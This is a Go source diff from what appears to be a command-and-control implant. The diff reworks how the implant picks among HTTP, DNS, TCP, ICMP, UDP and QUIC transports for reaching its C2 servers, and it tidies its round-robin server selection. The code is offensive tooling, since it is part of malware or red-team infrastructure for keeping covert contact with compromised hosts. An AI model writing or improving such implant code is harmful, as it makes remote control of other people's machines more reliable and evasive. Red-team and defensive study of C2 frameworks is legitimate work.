@@ -6,7 +6,6 @@ package main
 import (
 	"fmt"
 	mathRand "math/rand"
-	"strings"
 	"sync"
 	"sync/atomic"
 	"time"
@@ -44,7 +43,7 @@ func sendWithMode(body []byte) []byte {
 
 	case C2ModeRoundRobin:
 		currentC2Idx.Store(int32((int(currentC2Idx.Load()) + 1) % len(urls)))
-		resp := 	sendToC2(int(currentC2Idx.Load()), body)
+		resp := sendToC2(int(currentC2Idx.Load()), body)
 		if resp != nil {
 			recordSuccess(int(currentC2Idx.Load()))
 			return resp
@@ -120,7 +119,7 @@ func sendWithMode(body []byte) []byte {
 		return nil
 
 	default:
-		resp := 	sendToC2(int(currentC2Idx.Load()), body)
+		resp := sendToC2(int(currentC2Idx.Load()), body)
 		if resp != nil {
 			recordSuccess(int(currentC2Idx.Load()))
 			return resp
@@ -237,20 +236,25 @@ func buildTransportCandidates() []string {
 		}
 		cands = append(cands, t)
 	}
-	// HTTP is the universal fallback (only needs a C2URL).
-	add("http")
-	// DNS only when its dedicated config is present.
+	// Only advertise a transport when the implant actually has a matching
+	// endpoint (or, for DNS, dedicated domain/server config). Unconditional
+	// TCP/ICMP fallback against an HTTP listener dials the wrong framing.
+	if urlListHasTransport("http") || primary == "http" || (DNSDomain != "" && DNSServer != "") {
+		add("http")
+	}
 	if DNSDomain != "" && DNSServer != "" {
 		add("dns")
 	}
-	// TCP/ICMP are always technically reachable once a host resolves.
-	add("tcp")
-	add("icmp")
-	// UDP is reachable whenever a udp:// C2 endpoint is configured.
-	if strings.HasPrefix(C2URL, "udp://") || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "udp://") {
+	if urlListHasTransport("tcp") || primary == "tcp" {
+		add("tcp")
+	}
+	if urlListHasTransport("icmp") || primary == "icmp" {
+		add("icmp")
+	}
+	if urlListHasTransport("udp") || primary == "udp" {
 		add("udp")
 	}
-	if strings.HasPrefix(C2URL, "quic://") || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "quic://") {
+	if urlListHasTransport("quic") || primary == "quic" {
 		add("quic")
 	}
 	return cands
@@ -280,7 +284,11 @@ func applyTransport(name string) {
 	case "quic":
 		setProtocolAndTransport("quic", "quic")
 	default:
+		name = "http"
 		setProtocolAndTransport("http", "http")
+	}
+	if idx, ok := indexOfTransportURL(name); ok {
+		currentC2Idx.Store(int32(idx))
 	}
 }
 
